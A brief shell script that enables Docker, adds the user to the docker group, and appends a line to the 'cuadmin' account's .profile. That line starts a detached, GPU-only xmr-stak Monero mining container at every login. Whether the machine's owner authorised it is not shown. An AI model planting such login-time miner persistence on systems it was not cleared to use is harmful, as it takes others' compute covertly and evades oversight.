#!/bin/sh
sudo systemctl start docker && \
sudo systemctl enable docker && \
sudo groupadd docker
sudo usermod -aG docker $USER && \
echo "nvidia-docker run --rm -it -d -u $(id -u):$(id -g) --name xmr-stak -v /home/cuadmin/ubiquitous-octo-umbrella:/mnt xaviablaza/xmr-stak --config config.txt --noCPU" >> /home/cuadmin/.profile
